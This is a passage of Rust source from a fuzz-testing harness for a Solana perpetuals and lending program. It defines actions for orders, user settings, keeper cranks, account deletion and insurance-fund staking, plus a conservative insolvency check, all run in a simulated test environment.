    /// could never be pushed to, and the family XVIII assertion never fired.
    ///
    /// SOUNDNESS. Assets are summed at weight 1.0 and liabilities at weight 1.0 —
    /// the most generous treatment of the account that exists. The program uses
    /// `maintenance_asset_weight <= 1` and `maintenance_liability_weight >= 1`,
    /// so its collateral is <= ours and its requirement is >= ours. Therefore
    /// `liabs > assets` here IMPLIES the account fails maintenance, with no
    /// oracle, weight or staleness assumption of our own.
    ///
    /// Both sides use the LIVE oracle price. The program prices under
    /// `StrictOraclePrice`: assets at `min(live, twap)` (<= ours) and liabilities
    /// at `max(live, twap)` (>= ours), so strict pricing only widens the gap in
    /// the same direction. Unsettled funding and open-order reservations only ADD
    /// to the program's requirement. Every divergence is one-directional and
    /// conservative.
    fn is_unconditionally_insolvent(&self, user_pda: &Pubkey) -> bool {
        let Some(user) = self.read_user(user_pda) else {
            return false;
        };
        // Live prices, QUOTE_PRECISION. Markets 0/2/3 are QuoteAsset ($1); market
        // 1 and the perp read their injected PythLazer accounts. No price means
        // no judgement -- refusing to judge is the conservative direction here.
        let px_1 = match read_zc::<PythLazerOracle>(&self.ctx, &self.spot_1_oracle_pda) {
            Some(o) if o.price > 0 => o.price as i128,
            _ => return false,
        };
        let px_perp = match read_zc::<PythLazerOracle>(&self.ctx, &self.perp_oracle_pda) {
            Some(o) if o.price > 0 => o.price as i128,
            _ => return false,
        };
        let (Some(sm0), Some(sm1)) = (self.read_spot_market(), self.read_spot_market_1()) else {
            return false;
        };
        // The pool-1 markets must be valued through their OWN SpotMarket, not
        // market 0's — see the match below. Refusing to judge when either is
        // unreadable is the conservative direction.
        let (Some(sm2), Some(sm3)) = (self.read_pool1_market_a(), self.read_pool1_market_b())
        else {
            return false;
        };

        let mut assets: i128 = 0;
        let mut liabs: i128 = 0;
        for sp in user.spot_positions.iter() {
            if sp.scaled_balance == 0 {
                continue;
            }
            // Markets 2/3 mirror 0/1 BY MINT — so market 3 is 9-decimal like
            // market 1 — but both are QuoteAsset-priced at $1.
            //
            // Each must be valued through its OWN SpotMarket. `get_token_amount`
            // takes `precision_decrease` from whichever market it is handed, so
            // passing market 0 (6 decimals) for a market-3 balance (9 decimals)
            // understates it by 1000x; and understating a DEPOSIT makes the
            // account read as more insolvent than it is, which is the
            // false-positive direction and now costs the rest of the action
            // sequence. Market 2's decimals do line up with market 0's, but it
            // would still read market 0's interest indices rather than its own.
            //
            // Latent today — `market_ras` passes only markets 0 and 1, so the
            // victim cannot hold a 2/3 position on the `liquidate_spot` path —
            // but the arm exists to handle them, so it should be right.
            let (m, px, dec) = match sp.market_index {
                1 => (&sm1, px_1, 9u32),
                2 => (&sm2, PRICE_PRECISION as i128, 6u32),
                3 => (&sm3, PRICE_PRECISION as i128, 9u32),
                _ => (&sm0, PRICE_PRECISION as i128, 6u32),
            };
            let tok = velocity::math::spot_balance::get_token_amount(
                sp.scaled_balance as u128,
                m,
                &sp.balance_type,
            )
            .unwrap_or(0) as i128;
            let value = tok * px / 10i128.pow(dec);
            match sp.balance_type {
                SpotBalanceType::Deposit => assets += value,
                SpotBalanceType::Borrow => liabs += value,
            }
        }
        for pp in user.perp_positions.iter() {
            // Isolated collateral is quote-denominated, at index precision.
            assets += (pp.isolated_position_scaled_balance as i128)
                * (sm0.cumulative_deposit_interest as i128)
                / 10i128.pow(13);
            let base_value = (pp.base_asset_amount as i128) * px_perp
                / (BASE_PRECISION as i128)
                / (PRICE_PRECISION as i128 / QUOTE_PRECISION as i128);
            let net = base_value + pp.quote_asset_amount as i128;
            if net > 0 {
                assets += net
            } else {
                liabs += -net
            }
        }
        liabs > assets
    }

    /// Pick a REAL open order id belonging to `user_idx`, or `None`.
    ///
    /// Blind-fuzzing an order id is nearly always a miss: ids are monotonic and
    /// sparse, so `fill_perp_order`/`trigger_order`/`place_and_make` spend their
    /// budget on the "order not found" branch and never reach the matching logic.
    /// Reading the id back out of the User account is what lets those handlers
    /// get past their lookup and into the real work. `nth` keeps the choice
    /// fuzzer-driven (which of the open orders) while staying valid.
    fn pick_order_id(&self, user_idx: usize, nth: usize) -> Option<u32> {
        self.pick_order_id_filtered(user_idx, nth, false)
    }

    /// As `pick_order_id`, but `trigger_only` restricts the choice to
    /// TriggerLimit/TriggerMarket orders.
    ///
    /// `trigger_order` rejects anything that is not a trigger order, so feeding
    /// it a plain limit id only ever exercises that rejection.
    fn pick_order_id_filtered(
        &self,
        user_idx: usize,
        nth: usize,
        trigger_only: bool,
    ) -> Option<u32> {
        use velocity::state::user::{OrderStatus, OrderType};
        let user = self.read_user(&self.users[user_idx].user_pda)?;
        let open: Vec<u32> = user
            .orders
            .iter()
            .filter(|o| o.status == OrderStatus::Open)
            .filter(|o| {
                !trigger_only
                    || matches!(
                        o.order_type,
                        OrderType::TriggerLimit | OrderType::TriggerMarket
                    )
            })
            .map(|o| o.order_id)
            .collect();
        if open.is_empty() {
            return None;
        }
        Some(open[nth % open.len()])
    }

    /// Accounts shared by every `[state, user(w), authority(s)]` order ix, plus
    /// the oracle / quote-spot / perp market trio as remaining_accounts.
    fn order_ix_accounts(&self, user: &UserAcct) -> Vec<AccountMeta> {
        let mut a = vec![
            AccountMeta::new_readonly(self.state_pda(), false),
            AccountMeta::new(user.user_pda, false),
            AccountMeta::new_readonly(user.keypair.pubkey(), true),
        ];
        a.extend(self.market_ras(false));
        a
    }

    fn send_order_ix(&mut self, user_idx: usize, disc: [u8; 8], args: Vec<u8>) -> bool {
        let user = self.users[user_idx].clone();
        let accounts = self.order_ix_accounts(&user);
        self.ctx
            .raw_call(Instruction {
                program_id: self.program_id,
                accounts,
                data: ix_data(disc, &args),
            })
            .signers(&[&user.keypair])
            .send()
            .map(|o| o.is_success())
            .unwrap_or(false)
    }

    /// `cancel_orders(market_type, market_index, direction)` — the bulk cancel.
    /// Each filter is an independent `Option`, so the fuzzer explores the
    /// "cancel everything" path and every narrowing combination.
    pub fn action_cancel_orders(
        &mut self,
        #[range(0..NUM_USERS)] user_idx: usize,
        #[range(0..2u8)] with_market_type: u8,
        #[range(0..2u8)] market_type: u8,
        #[range(0..2u8)] with_market_index: u8,
        #[range(0..3u16)] market_index: u16,
        #[range(0..2u8)] with_direction: u8,
        #[range(0..2u8)] direction: u8,
    ) -> bool {
        let mut args = Vec::new();
        push_opt_u8(&mut args, with_market_type == 1, market_type.min(1));
        push_opt(
            &mut args,
            with_market_index == 1,
            &market_index.to_le_bytes(),
        );
        push_opt_u8(&mut args, with_direction == 1, direction.min(1));
        self.send_order_ix(user_idx, D_CANCEL_ORDERS, args)
    }

    /// `cancel_orders_by_ids(Vec<u32>)`.
    pub fn action_cancel_orders_by_ids(
        &mut self,
        #[range(0..NUM_USERS)] user_idx: usize,
        #[range(0..5u32)] n: u32,
        #[range(0..40u32)] first_id: u32,
    ) -> bool {
        let mut args = Vec::new();
        args.extend_from_slice(&n.to_le_bytes()); // borsh Vec length prefix
        for k in 0..n {
            args.extend_from_slice(&first_id.saturating_add(k).to_le_bytes());
        }
        self.send_order_ix(user_idx, D_CANCEL_ORDERS_BY_IDS, args)
    }

    /// `cancel_order_by_user_id(user_order_id)`.
    pub fn action_cancel_order_by_user_id(
        &mut self,
        #[range(0..NUM_USERS)] user_idx: usize,
        #[range(0..40u8)] user_order_id: u8,
    ) -> bool {
        self.send_order_ix(user_idx, D_CANCEL_ORDER_BY_USER_ID, vec![user_order_id])
    }

    /// `modify_order(Option<order_id>, ModifyOrderParams)` — every field of the
    /// params is optional, so this drives the full "which fields changed"
    /// matrix through the modify path (including the post-only Slide policy).
    pub fn action_modify_order(
        &mut self,
        #[range(0..NUM_USERS)] user_idx: usize,
        #[range(0..2u8)] with_order_id: u8,
        #[range(0..40u32)] order_id: u32,
        #[range(0..2u8)] with_direction: u8,
        #[range(0..2u8)] direction: u8,
        #[range(0..2u8)] with_base: u8,
        #[range(1..1_000_000_000u64)] base: u64,
        #[range(0..2u8)] with_price: u8,
        #[range(1..3_000_000u64)] price: u64,
        #[range(0..2u8)] with_reduce_only: u8,
        #[range(0..2u8)] reduce_only: u8,
        #[range(0..2u8)] with_policy: u8,
        #[range(0..2u8)] policy: u8,
    ) -> bool {
        let mut args = Vec::new();
        push_opt(&mut args, with_order_id == 1, &order_id.to_le_bytes());
        args.extend_from_slice(&modify_params_bytes(
            with_direction == 1,
            direction.min(1),
            with_base == 1,
            base,
            with_price == 1,
            price,
            with_reduce_only == 1,
            reduce_only == 1,
            with_policy == 1,
            policy.min(1),
        ));
        self.send_order_ix(user_idx, D_MODIFY_ORDER, args)
    }

    /// `modify_order_by_user_id(user_order_id, ModifyOrderParams)`.
    pub fn action_modify_order_by_user_id(
        &mut self,
        #[range(0..NUM_USERS)] user_idx: usize,
        #[range(0..40u8)] user_order_id: u8,
        #[range(0..2u8)] with_price: u8,
        #[range(1..3_000_000u64)] price: u64,
        #[range(0..2u8)] with_base: u8,
        #[range(1..1_000_000_000u64)] base: u64,
    ) -> bool {
        let mut args = vec![user_order_id];
        args.extend_from_slice(&modify_params_bytes(
            false,
            0,
            with_base == 1,
            base,
            with_price == 1,
            price,
            false,
            false,
            false,
            0,
        ));
        self.send_order_ix(user_idx, D_MODIFY_ORDER_BY_USER_ID, args)
    }

    /// `place_orders(Vec<OrderParams>)` — the batch-place path, including the
    /// per-batch order-count limits.
    pub fn action_place_orders(
        &mut self,
        #[range(0..NUM_USERS)] user_idx: usize,
        #[range(0..6u32)] n: u32,
        #[range(0..2u8)] dir: u8,
        #[range(1..1_000_000_000u64)] base: u64,
    ) -> bool {
        use velocity::{
            controller::position::PositionDirection,
            state::{
                order_params::{OrderParams, PostOnlyParam},
                user::{MarketType, OrderType},
            },
        };

        let (direction, price) = if dir == 0 {
            (PositionDirection::Long, 900_000u64)
        } else {
            (PositionDirection::Short, 1_100_000u64)
        };
        let mut batch = Vec::new();
        for k in 0..n {
            batch.push(OrderParams {
                order_type: OrderType::Limit,
                market_type: MarketType::Perp,
                direction,
                // 0 means "unset". A fixed 1..n collides with ids placed by the
                // other order actions and the whole batch is rejected with
                // UserOrderIdAlreadyInUse before a single order is placed.
                user_order_id: 0,
                base_asset_amount: base,
                price,
                market_index: 0,
                post_only: PostOnlyParam::MustPostOnly,
                ..Default::default()
            });
        }
        let mut buf = Vec::new();
        batch.serialize(&mut buf).unwrap();
        self.send_order_ix(user_idx, D_PLACE_ORDERS, buf)
    }

    // ---- user config setters ---------------------------------------------
    //
    // `[user(w), authority(s)]`, args `(_sub_account_id, value)`. These mutate
    // margin/trading policy that the *other* actions then run under, so they
    // are not just coverage padding: they widen the state the order and
    // deposit/withdraw paths are exercised against.

    fn send_user_setter(&mut self, user_idx: usize, disc: [u8; 8], value: Vec<u8>) -> bool {
        self.send_user_setter_for(user_idx, 0, disc, value)
    }

    fn send_user_setter_for(
        &mut self,
        user_idx: usize,
        sub_account_id: u16,
        disc: [u8; 8],
        value: Vec<u8>,
    ) -> bool {
        let user = self.users[user_idx].clone();
        let target_pda = if sub_account_id == 0 {
            user.user_pda
        } else {
            Pubkey::find_program_address(
                &[
                    b"user",
                    user.keypair.pubkey().as_ref(),
                    &sub_account_id.to_le_bytes(),
                ],
                &self.program_id,
            )
            .0
        };
        // The `user` account is PDA-seeded on the sub_account_id ARG, so the arg
        // must name the same sub-account as the account being passed or the
        // seeds constraint fails.
        let mut args = sub_account_id.to_le_bytes().to_vec();
        args.extend_from_slice(&value);
        // Several setters (pool id, margin ratio, reduce-only) re-run the margin
        // calculation, which walks EVERY market the user holds — omitting them
        // fails with SpotMarketNotFound before the setter does anything.
        let mut accounts = vec![
            AccountMeta::new(target_pda, false),
            AccountMeta::new_readonly(user.keypair.pubkey(), true),
        ];
        accounts.extend(self.market_ras(false));
        self.ctx
            .raw_call(Instruction {
                program_id: self.program_id,
                accounts,
                data: ix_data(disc, &args),
            })
            .signers(&[&user.keypair])
            .send()
            .map(|o| o.is_success())
            .unwrap_or(false)
    }

    /// Custom (tighter-than-market) initial margin ratio.
    pub fn action_update_user_custom_margin_ratio(
        &mut self,
        #[range(0..NUM_USERS)] user_idx: usize,
        #[range(0..20_000u32)] margin_ratio: u32,
    ) -> bool {
        self.send_user_setter(
            user_idx,
            D_UPDATE_USER_CUSTOM_MARGIN_RATIO,
            margin_ratio.to_le_bytes().to_vec(),
        )
    }

    /// Toggle margin trading — gates the borrow paths in deposit/withdraw.
    pub fn action_update_user_margin_trading_enabled(
        &mut self,
        #[range(0..NUM_USERS)] user_idx: usize,
        #[range(0..2u8)] enabled: u8,
    ) -> bool {
        self.send_user_setter(
            user_idx,
            D_UPDATE_USER_MARGIN_TRADING_ENABLED,
            vec![(enabled == 1) as u8],
        )
    }

    /// Toggle reduce-only — gates order placement and withdrawal.
    pub fn action_update_user_reduce_only(
        &mut self,
        #[range(0..NUM_USERS)] user_idx: usize,
        #[range(0..2u8)] reduce_only: u8,
    ) -> bool {
        self.send_user_setter(
            user_idx,
            D_UPDATE_USER_REDUCE_ONLY,
            vec![(reduce_only == 1) as u8],
        )
    }

    pub fn action_update_user_name(
        &mut self,
        #[range(0..NUM_USERS)] user_idx: usize,
        #[range(0..256u16)] byte: u16,
    ) -> bool {
        self.send_user_setter(user_idx, D_UPDATE_USER_NAME, vec![byte as u8; 32])
    }

    /// Pool id must match the markets the user touches, so a nonzero value
    /// exercises the pool-mismatch rejection in the deposit/order paths.
    pub fn action_update_user_pool_id(
        &mut self,
        #[range(0..NUM_USERS)] user_idx: usize,
        #[range(0..4u8)] pool_id: u8,
    ) -> bool {
        self.send_user_setter(user_idx, D_UPDATE_USER_POOL_ID, vec![pool_id])
    }

    /// Delegate to the other user's authority (or clear it).
    pub fn action_update_user_delegate(
        &mut self,
        #[range(0..NUM_USERS)] user_idx: usize,
        #[range(0..2u8)] clear: u8,
        #[range(0..4u16)] sub_account_id: u16,
    ) -> bool {
        let delegate = if clear == 1 {
            Pubkey::new_from_array([0u8; 32])
        } else {
            self.users[(user_idx + 1) % NUM_USERS].keypair.pubkey()
        };
        // `transfer_deposit_by_delegate` has `has_one = delegate` on BOTH
        // from_user and to_user, so the delegate must be settable on a
        // sub-account too, not just sub-account 0.
        self.send_user_setter_for(
            user_idx,
            sub_account_id,
            D_UPDATE_USER_DELEGATE,
            delegate.to_bytes().to_vec(),
        )
    }

    /// Per-perp-position custom margin ratio.
    pub fn action_update_user_perp_position_custom_margin_ratio(
        &mut self,
        #[range(0..NUM_USERS)] user_idx: usize,
        #[range(0..3u16)] perp_market_index: u16,
        #[range(0..20_000u16)] margin_ratio: u16,
    ) -> bool {
        let mut value = perp_market_index.to_le_bytes().to_vec();
        value.extend_from_slice(&margin_ratio.to_le_bytes());
        self.send_user_setter(
            user_idx,
            D_UPDATE_USER_PERP_POSITION_CUSTOM_MARGIN_RATIO,
            value,
        )
    }

    /// `update_user_allow_delegate_transfer` is the odd one out: it takes
    /// `[user_stats(w), authority(s)]` and no sub_account_id.
    pub fn action_update_user_allow_delegate_transfer(
        &mut self,
        #[range(0..NUM_USERS)] user_idx: usize,
        #[range(0..2u8)] allow: u8,
    ) -> bool {
        let user = self.users[user_idx].clone();
        self.ctx
            .raw_call(Instruction {
                program_id: self.program_id,
                accounts: vec![
                    AccountMeta::new(user.stats_pda, false),
                    AccountMeta::new_readonly(user.keypair.pubkey(), true),
                ],
                data: ix_data(D_UPDATE_USER_ALLOW_DELEGATE_TRANSFER, &[(allow == 1) as u8]),
            })
            .signers(&[&user.keypair])
            .send()
            .map(|o| o.is_success())
            .unwrap_or(false)
    }

    // ---- permissionless pokes (one user cranks another) -------------------
    //
    // `[state, authority(s), filler(w), user(w)]`. The signer is the *filler's*
    // authority, so these exercise the "someone else touches your account"
    // permission checks — a surface the single-authority actions never reach.

    fn send_filler_ix(&mut self, target_idx: usize, filler_idx: usize, disc: [u8; 8]) -> bool {
        let target = self.users[target_idx].clone();
        let filler = self.users[filler_idx % NUM_USERS].clone();
        self.ctx
            .raw_call(Instruction {
                program_id: self.program_id,
                accounts: vec![
                    AccountMeta::new_readonly(self.state_pda(), false),
                    AccountMeta::new_readonly(filler.keypair.pubkey(), true),
                    AccountMeta::new(filler.user_pda, false),
                    AccountMeta::new(target.user_pda, false),
                ]
                .into_iter()
                // Writable: force_cancel_orders settles balances, so read-only
                // spot markets are rejected with SpotMarketWrongMutability.
                .chain(self.market_ras(true))
                .collect(),
                data: ix_data(disc, &[]),
            })
            .signers(&[&filler.keypair])
            .send()
            .map(|o| o.is_success())
            .unwrap_or(false)
    }

    /// Mark an inactive account idle (permissionless keeper crank).
    pub fn action_update_user_idle(
        &mut self,
        #[range(0..NUM_USERS)] target_idx: usize,
        #[range(0..NUM_USERS)] filler_idx: usize,
        #[range(0..2u8)] target_fresh: u8,
        #[range(0..NUM_FRESH)] fresh_idx: usize,
    ) -> bool {
        // Two gates: the account must have been untouched for
        // `slots_before_idle`, and that threshold is 9,000 slots (~1h) only on
        // the ACCELERATED path (equity < $1,000) — otherwise it is 1,512,000
        // (~1 week). The fixture's users hold hundreds of thousands of USDC, so
        // they take the slow path, and the fuzzer keeps touching them, which
        // resets `last_active_slot`. Both together make this unreachable in
        // practice.
        //
        // A bootstrapped-empty `fresh` account has zero equity, so it takes the
        // accelerated path; warping just past the threshold then satisfies the
        // inactivity gate.
        if target_fresh == 1 {
            let _ = self.action_initialize_user_stats(fresh_idx);
            let _ = self.action_initialize_fresh_user(fresh_idx, 0);
            let kp = self.fresh[fresh_idx].clone();
            let (user_pda, _) = Pubkey::find_program_address(
                &[b"user", kp.pubkey().as_ref(), &0u16.to_le_bytes()],
                &self.program_id,
            );
            // Just past the accelerated threshold (9,000 slots).
            let _ = self.action_warp(9_100, 1);
            let filler = self.users[filler_idx % NUM_USERS].clone();
            return self
                .ctx
                .raw_call(Instruction {
                    program_id: self.program_id,
                    accounts: vec![
                        AccountMeta::new_readonly(self.state_pda(), false),
                        AccountMeta::new_readonly(filler.keypair.pubkey(), true),
                        AccountMeta::new(filler.user_pda, false),
                        AccountMeta::new(user_pda, false),
                    ]
                    .into_iter()
                    .chain(self.market_ras(true))
                    .collect(),
                    data: ix_data(D_UPDATE_USER_IDLE, &[]),
                })
                .signers(&[&filler.keypair])
                .send()
                .map(|o| o.is_success())
                .unwrap_or(false);
        }
        self.send_filler_ix(target_idx, filler_idx, D_UPDATE_USER_IDLE)
    }

    /// Permissionlessly cancel an undercollateralized account's orders.
    pub fn action_force_cancel_orders(
        &mut self,
        #[range(0..NUM_USERS)] target_idx: usize,
        #[range(0..NUM_USERS)] filler_idx: usize,
        #[range(0..2u8)] setup: u8,
    ) -> bool {
        // Needs BOTH conditions at once: the target must be below initial margin
        // AND still hold open orders. The fuzzer reaches each separately all the
        // time but rarely together — an account that goes underwater usually got
        // there through a path that also cleared its book. COMPOUND: place a
        // resting order first, then borrow to the margin limit so the account is
        // one oracle step from failing, leaving the order outstanding.
        if setup == 1 {
            let _ = self.action_place_perp_order(target_idx, 0, 10_000_000, 0, 0, 0, 7, 0);
            let _ = self.action_borrow_to_margin_limit(target_idx, 100);
            // Push the borrowed asset up so initial margin actually breaks.
            for _ in 0..12 {
                let _ = self.action_move_spot_1_oracle_price(1, 99, 0, 0, 0);
            }
        }
        self.send_filler_ix(target_idx, filler_idx, D_FORCE_CANCEL_ORDERS)
    }

    /// `log_user_balances` — `[state, authority(s), user(w)]`, no filler.
    pub fn action_log_user_balances(
        &mut self,
        #[range(0..NUM_USERS)] target_idx: usize,
        #[range(0..NUM_USERS)] signer_idx: usize,
    ) -> bool {
        let target = self.users[target_idx].clone();
        let signer = self.users[signer_idx % NUM_USERS].clone();
        self.ctx
            .raw_call(Instruction {
                program_id: self.program_id,
                accounts: vec![
                    AccountMeta::new_readonly(self.state_pda(), false),
                    AccountMeta::new_readonly(signer.keypair.pubkey(), true),
                    AccountMeta::new(target.user_pda, false),
                ]
                .into_iter()
                .chain(self.market_ras(true))
                .collect(),
                data: ix_data(D_LOG_USER_BALANCES, &[]),
            })
            .signers(&[&signer.keypair])
            .send()
            .map(|o| o.is_success())
            .unwrap_or(false)
    }

    // ---- account lifecycle ------------------------------------------------

    /// `delete_user` — only legal once the account is fully wound down, so this
    /// mostly exercises the "refuse to delete" guards (open orders, nonzero
    /// balance, not idle) and occasionally the real teardown.
    pub fn action_delete_user(
        &mut self,
        #[range(0..NUM_USERS)] user_idx: usize,
        #[range(0..2u8)] target_fresh: u8,
        #[range(0..NUM_FRESH)] fresh_idx: usize,
    ) -> bool {
        // `validate_user_deletion` requires EVERY perp position, spot position
        // and order to be empty. The fixture's own users are funded at setup and
        // are the fuzzer's main trading subjects, so they essentially never
        // return to that state — aimed at them this handler only ever reaches
        // its "user has spot position" rejection. A `fresh` authority's account
        // is bootstrapped empty, which is exactly the abandoned sub-account this
        // instruction exists to reap. COMPOUND: create it here rather than
        // relying on the fuzzer to emit the bootstrap immediately before.
        let (authority, user_pda, stats_pda) = if target_fresh == 1 {
            let _ = self.action_initialize_user_stats(fresh_idx);
            let _ = self.action_initialize_fresh_user(fresh_idx, 0);
            let kp = self.fresh[fresh_idx].clone();
            let (stats_pda, _) = Pubkey::find_program_address(
                &[b"user_stats", kp.pubkey().as_ref()],
                &self.program_id,
            );
            let (user_pda, _) = Pubkey::find_program_address(
                &[b"user", kp.pubkey().as_ref(), &0u16.to_le_bytes()],
                &self.program_id,
            );
            (kp, user_pda, stats_pda)
        } else {
            let user = self.users[user_idx].clone();
            (user.keypair.clone(), user.user_pda, user.stats_pda)
        };
        self.ctx
            .raw_call(Instruction {
                program_id: self.program_id,
                accounts: vec![
                    AccountMeta::new(user_pda, false),
                    AccountMeta::new(stats_pda, false),
                    AccountMeta::new(self.state_pda(), false),
                    AccountMeta::new(authority.pubkey(), true),
                ],
                data: ix_data(D_DELETE_USER, &[]),
            })
            .signers(&[&authority])
            .send()
            .map(|o| o.is_success())
            .unwrap_or(false)
    }

    /// `reclaim_rent` — shrink an over-allocated User account and refund rent.
    pub fn action_reclaim_rent(&mut self, #[range(0..NUM_USERS)] user_idx: usize) -> bool {
        let user = self.users[user_idx].clone();
        self.ctx
            .raw_call(Instruction {
                program_id: self.program_id,
                accounts: vec![
                    AccountMeta::new(user.user_pda, false),
                    AccountMeta::new(user.stats_pda, false),
                    AccountMeta::new_readonly(self.state_pda(), false),
                    AccountMeta::new_readonly(user.keypair.pubkey(), true),
                    AccountMeta::new_readonly(rent_sysvar_id(), false),
                ],
                data: ix_data(D_RECLAIM_RENT, &[]),
            })
            .signers(&[&user.keypair])
            .send()
            .map(|o| o.is_success())
            .unwrap_or(false)
    }

    // ---- insurance fund staking -------------------------------------------
    //
    // The whole lifecycle runs on the EXISTING fixture: spot market 0, its vault,
    // and the IF vault are all already injected, and the IF-stake account is
    // created by the first instruction. `e2e-svm-liq` drives add/remove but never
    // initialize/request/cancel, so those were unreachable campaign-wide.

    fn if_stake_pda(&self, authority: &Pubkey) -> Pubkey {
        Pubkey::find_program_address(
            &[
                b"insurance_fund_stake",
                authority.as_ref(),
                &0u16.to_le_bytes(),
            ],
            &self.program_id,
        )
        .0
    }

    /// `initialize_insurance_fund_stake(market_index)`.
    pub fn action_initialize_if_stake(
        &mut self,
        #[range(0..NUM_USERS)] user_idx: usize,
        #[range(0..3u16)] market_index: u16,
    ) -> bool {
        let user = self.users[user_idx].clone();
        let stake = self.if_stake_pda(&user.keypair.pubkey());
        self.ctx
            .raw_call(Instruction {
                program_id: self.program_id,
                accounts: vec![
                    AccountMeta::new_readonly(self.spot_market_pda, false),
                    AccountMeta::new(stake, false),
                    AccountMeta::new(user.stats_pda, false),
                    AccountMeta::new_readonly(self.state_pda(), false),
                    AccountMeta::new_readonly(user.keypair.pubkey(), true),
                    AccountMeta::new(user.keypair.pubkey(), true), // payer
                    AccountMeta::new_readonly(rent_sysvar_id(), false),
                    AccountMeta::new_readonly(system_program_id(), false),
                ],
                data: ix_data(D_INITIALIZE_IF_STAKE, &market_index.to_le_bytes()),
            })
            .signers(&[&user.keypair])
            .send()
            .map(|o| o.is_success())
            .unwrap_or(false)
    }

    /// `add_insurance_fund_stake(market_index, amount)`.
    pub fn action_add_if_stake(
        &mut self,
        #[range(0..NUM_USERS)] user_idx: usize,
        #[range(1..100_000_000_000u64)] amount: u64,
    ) -> bool {
        let user = self.users[user_idx].clone();
        let stake = self.if_stake_pda(&user.keypair.pubkey());
        let mut args = 0u16.to_le_bytes().to_vec();
        args.extend_from_slice(&amount.to_le_bytes());
        self.ctx
            .raw_call(Instruction {
                program_id: self.program_id,
                accounts: vec![
                    AccountMeta::new_readonly(self.state_pda(), false),
                    AccountMeta::new(self.spot_market_pda, false),
                    AccountMeta::new(stake, false),
                    AccountMeta::new(user.stats_pda, false),
                    AccountMeta::new_readonly(user.keypair.pubkey(), true),
                    AccountMeta::new(self.spot_vault_pda, false),
                    AccountMeta::new(self.if_vault_pda, false),
                    AccountMeta::new_readonly(self.signer_pda, false),
                    AccountMeta::new(user.token_account, false),
                    AccountMeta::new_readonly(token_program_id(), false),
                ],
                data: ix_data(D_ADD_IF_STAKE, &args),
            })
            .signers(&[&user.keypair])
            .send()
            .map(|o| o.is_success())
            .unwrap_or(false)
    }

    /// `request_remove_insurance_fund_stake(market_index, amount)` — starts the
    /// unstaking cooldown (the state `cancel_request_remove` then clears).
    pub fn action_request_remove_if_stake(
        &mut self,
        #[range(0..NUM_USERS)] user_idx: usize,
        #[range(1..100_000_000_000u64)] amount: u64,
    ) -> bool {
        let user = self.users[user_idx].clone();
        let stake = self.if_stake_pda(&user.keypair.pubkey());
        let mut args = 0u16.to_le_bytes().to_vec();
        args.extend_from_slice(&amount.to_le_bytes());
        self.ctx
            .raw_call(Instruction {
                program_id: self.program_id,
                accounts: vec![
                    AccountMeta::new_readonly(self.state_pda(), false),
                    AccountMeta::new(self.spot_market_pda, false),
                    AccountMeta::new(stake, false),
                    AccountMeta::new(user.stats_pda, false),
                    AccountMeta::new_readonly(user.keypair.pubkey(), true),
                    AccountMeta::new(self.spot_vault_pda, false),
                    AccountMeta::new(self.if_vault_pda, false),
                    AccountMeta::new_readonly(self.signer_pda, false),
                    AccountMeta::new_readonly(token_program_id(), false),
                ],
                data: ix_data(D_REQUEST_REMOVE_IF_STAKE, &args),
            })
            .signers(&[&user.keypair])
            .send()
            .map(|o| o.is_success())
            .unwrap_or(false)
    }

    /// `cancel_request_remove_insurance_fund_stake(market_index)`.
    pub fn action_cancel_request_remove_if_stake(
        &mut self,
        #[range(0..NUM_USERS)] user_idx: usize,
    ) -> bool {
        let user = self.users[user_idx].clone();
        let stake = self.if_stake_pda(&user.keypair.pubkey());
        self.ctx
            .raw_call(Instruction {
                program_id: self.program_id,
                accounts: vec![
                    AccountMeta::new(self.spot_market_pda, false),
                    AccountMeta::new(stake, false),
                    AccountMeta::new(user.stats_pda, false),
                    AccountMeta::new_readonly(user.keypair.pubkey(), true),
                    AccountMeta::new(self.if_vault_pda, false),
                ],
                data: ix_data(D_CANCEL_REQUEST_REMOVE_IF_STAKE, &0u16.to_le_bytes()),
            })
            .signers(&[&user.keypair])
            .send()
            .map(|o| o.is_success())
            .unwrap_or(false)
    }

    /// `remove_insurance_fund_stake(market_index)` — completes the unstake once
    /// the cooldown has elapsed (pair with `action_warp`).
    pub fn action_remove_if_stake(
        &mut self,
        #[range(0..NUM_USERS)] user_idx: usize,
        #[range(0..2u8)] setup: u8,
    ) -> bool {
        // COMPOUND: an unstake needs a standing request AND the cooldown served.
        //
        // The chain is initialize -> add -> request -> WAIT -> remove, and the
        // wait is `unstaking_period` = 3600s. `action_warp` tops out at 5,000
        // slots (~2,000s at 400ms), so no SINGLE warp clears it — the fuzzer had
        // to emit two warps between the request and the remove, in order, with
        // nothing in between resetting the request. That is why this action
        // never succeeded across millions of iterations.
        if setup == 1 {
            let _ = self.action_initialize_if_stake(user_idx, 0);
            let _ = self.action_add_if_stake(user_idx, 1_000 * QUOTE_PRECISION as u64);
            let _ = self.action_request_remove_if_stake(user_idx, 100 * QUOTE_PRECISION as u64);
            // Two warps: comfortably past the 3,600s cooldown.
            let _ = self.action_warp(4_999, 1);
            let _ = self.action_warp(4_999, 1);
        }
        let user = self.users[user_idx].clone();
        let stake = self.if_stake_pda(&user.keypair.pubkey());
        self.ctx
            .raw_call(Instruction {
                program_id: self.program_id,
                accounts: vec![
                    AccountMeta::new_readonly(self.state_pda(), false),
                    AccountMeta::new(self.spot_market_pda, false),
                    AccountMeta::new(stake, false),
                    AccountMeta::new(user.stats_pda, false),
                    AccountMeta::new_readonly(user.keypair.pubkey(), true),
                    AccountMeta::new(self.if_vault_pda, false),
                    AccountMeta::new_readonly(self.signer_pda, false),
                    AccountMeta::new(user.token_account, false),
                    AccountMeta::new_readonly(token_program_id(), false),
                ],
                data: ix_data(D_REMOVE_IF_STAKE, &0u16.to_le_bytes()),
            })
            .signers(&[&user.keypair])
            .send()
            .map(|o| o.is_success())
            .unwrap_or(false)
    }

    // ---- revenue / fee plumbing -------------------------------------------

    /// `deposit_into_spot_market_revenue_pool(amount)` — anyone can donate to the
    /// revenue pool; this is also the cheapest way to give
    /// `settle_revenue_to_insurance_fund` something real to move.
    pub fn action_deposit_into_revenue_pool(
        &mut self,
        #[range(0..NUM_USERS)] user_idx: usize,
        #[range(1..100_000_000_000u64)] amount: u64,
    ) -> bool {
        let user = self.users[user_idx].clone();
        self.ctx
            .raw_call(Instruction {
                program_id: self.program_id,
                accounts: vec![
                    AccountMeta::new_readonly(self.state_pda(), false),
                    AccountMeta::new(self.spot_market_pda, false),
                    AccountMeta::new(user.keypair.pubkey(), true),
                    AccountMeta::new(self.spot_vault_pda, false),
                    AccountMeta::new(user.token_account, false),
                    AccountMeta::new_readonly(token_program_id(), false),
                ],
